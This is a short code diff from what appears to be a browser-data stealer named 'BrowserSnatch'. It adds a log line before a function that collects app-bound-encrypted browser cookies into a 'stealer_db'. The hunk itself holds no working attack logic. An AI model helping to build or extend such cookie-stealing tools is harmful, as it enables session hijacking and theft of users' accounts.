@@ -329,6 +329,7 @@ void Visualizer::handler(int option, std::string service_parameter)
     else if (option == 14)
     {
         //app-bound-decryption
+        std::cout << "Target App-Bound-Encrypted Cookies..." << std::endl;
         if (!app_bound_browsers_cookie_collector(converted_username, stealer_db, false, ""))
             std::cerr << "BrowserSnatch executed with {app_bound_decryption mode}: failed" << std::endl;
 
